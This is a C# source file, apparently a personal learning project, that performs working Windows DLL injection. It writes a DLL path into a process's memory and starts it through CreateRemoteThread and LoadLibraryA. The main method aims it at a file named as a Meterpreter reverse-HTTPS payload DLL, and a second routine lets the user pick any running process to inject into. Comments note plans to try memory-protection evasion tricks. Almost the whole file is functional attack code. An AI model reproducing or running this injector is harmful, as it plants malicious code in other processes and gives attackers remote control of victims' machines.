using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace DLLInjectionTest
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(
            int dwDesiredAcess,
            bool bInheritHandle,
            int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out UIntPtr lpNumberOfBytesWritten);

        // Retrieves the address of an exported function (procedure) or variable from the specified DLL.
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(
            IntPtr hModule, 
            string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);

        // process constants
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;

        // memory protection constants
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 0x04;

        public static void Main(string[] args)
        {
            // example dll path
            string myDllPath = "C:\\Users\\proha\\OneDrive\\Desktop\\payloads\\plain_x64meterpreter_reverse_https_4443.dll";
            SelfInject(myDllPath);
        }

        public static void SelfInject(string dllPath)
        {
            // works!
            // get process ID of current process
            int currProcId = Process.GetCurrentProcess().Id;
            // inject
            InjectDLL(currProcId, dllPath);
        }

        public static void PromptForSelectionThenInject(string dllPath)
        {
            // list out processes to choose which to inject DLL to
            Process[] procs = Process.GetProcesses();
            foreach (Process proc in procs)
            {
                // ignore if there is an error
                try
                {
                    Console.WriteLine($"Id: {proc.Id} | Name: {proc.ProcessName} | Path: {proc.MainModule?.FileName}");
                }
                catch (Exception)
                {
                    continue;
                }
            }
            // prompt user for ID of process to inject to
            Console.WriteLine("");
            int desiredTargetProcessId = Convert.ToInt32(Console.ReadLine());
            // inject the DLL
            InjectDLL(desiredTargetProcessId, dllPath);
        }

        public static void InjectDLL(int processId, string dllPath)
        {
            // 1. open a handle to the target process
            IntPtr procHandle = OpenProcess(
                // bitwise or all of these mem protection constants
                // i.e. combine all of them to get all of their PERMISSIONS for the proc
                PROCESS_CREATE_THREAD
                    | PROCESS_QUERY_INFORMATION
                    | PROCESS_VM_OPERATION
                    | PROCESS_VM_WRITE
                    | PROCESS_VM_READ,
                false,
                processId);

            // size of memory region to contain the dll path
            // convert the size to unsigned int before passing it in
            // as size quantities are implemented as >= 0
            // convert to int32 first to avoid "cannot convert from long to uint"
            uint targetMemRegionSize = (uint)Convert.ToInt32((dllPath.Length + 1) * Marshal.SizeOf(typeof(char)));

            // 2. allocate memory in the target process
            // size is 1 character more than the length of the DLLpath
            IntPtr memAddr = VirtualAllocEx(
                procHandle,
                IntPtr.Zero,
                targetMemRegionSize,
                // reserve a space in memory (contiguous block for virtual mem pages)
                // also commit (actually allocate) the virtual memory pages to that block
                MEM_COMMIT | MEM_RESERVE,
                // give the committed region of virtual memory pages RW
                // (???) why not RWX? try this later.
                    // ^ try with RW first
                    // ^ then try RW-then-RX trick later 
                PAGE_READWRITE);

            // 3. write the dllpath to the memory of the target process
            UIntPtr _; // throwaway variable to get num. of bytes written
            bool resultOfWPM = WriteProcessMemory(
                procHandle,
                memAddr,
                Encoding.Default.GetBytes(dllPath),
                targetMemRegionSize,
                out _);

            // 4. get the address of `LoadLibraryA` from `kernel32.dll`
            // `kernel32.dll` MUST BE LOADED IN HERE (the current process) to be able to be accessed
            // luckily, this DLL is loaded in EVERY WINDOWS USER PROCESS!
            IntPtr addrOfLoadLibraryA = GetProcAddress(
                GetModuleHandle("kernel32.dll"),
                "LoadLibraryA");

            // 5. create a thread in the target process to run the injected DLL
            // (???) works even though memory of `memAddr` was declared as just RW instead of having X
            CreateRemoteThread(
                procHandle,
                IntPtr.Zero,
                0,
                addrOfLoadLibraryA,
                memAddr,
                0,
                IntPtr.Zero);

            // good manners: close the handle after usage is done
            CloseHandle(procHandle);
        }
    }
}
